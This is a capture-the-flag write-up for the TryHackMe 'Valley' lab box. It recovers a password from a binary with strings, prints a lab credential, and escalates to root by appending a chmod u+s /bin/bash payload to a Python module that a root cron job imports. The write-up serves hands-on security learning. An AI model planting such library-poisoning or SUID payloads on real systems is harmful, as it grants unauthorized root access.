---
title: "Valley"
type: docs
tags:
  - thm
  - linux
  - easy
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Easy

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Web enumeration leads to credentials / access as **valleyDev**.
2. In `/home` there is a custom `auth` binary, pull it, run `strings` on it, recover the password for the **valley** user.
3. `/etc/crontab` shows root runs a scheduled task; our user is in the **valleyAdmin** group.
4. `valleyAdmin` owns a writable Python module (`/usr/lib/python3.8/base64.py`) that the root cron imports, poison it to `chmod u+s /bin/bash`.
5. `bash -p` → root.

</div>

<div class="callout callout-key">

**Credentials**

- Web / hint value: `ph0t0s1234`
- User: `valleyDev` → then `valley` (password from the `auth` binary)

</div>

## Foothold, the `auth` binary

After landing as `valleyDev`, an `auth` binary sits in a home directory. Download it and pull static strings:

```bash
strings ./auth
```

The recovered/decrypted password logs us into the **valley** user.

## Privilege Escalation, writable library imported by root cron

Check scheduled tasks:

```bash
cat /etc/crontab
```

Root runs a cron job. Our user belongs to `valleyAdmin`, so look for files owned by that group:

```bash
find / -group valleyAdmin -type f 2>/dev/null
```

This returns `/usr/lib/python3.8/base64.py`, a standard-library module the root script imports. Append a payload to it:

```python
import os
os.system('chmod u+s /bin/bash')
```

Wait for the cron to run, then drop into a root shell:

```bash
bash -p
```
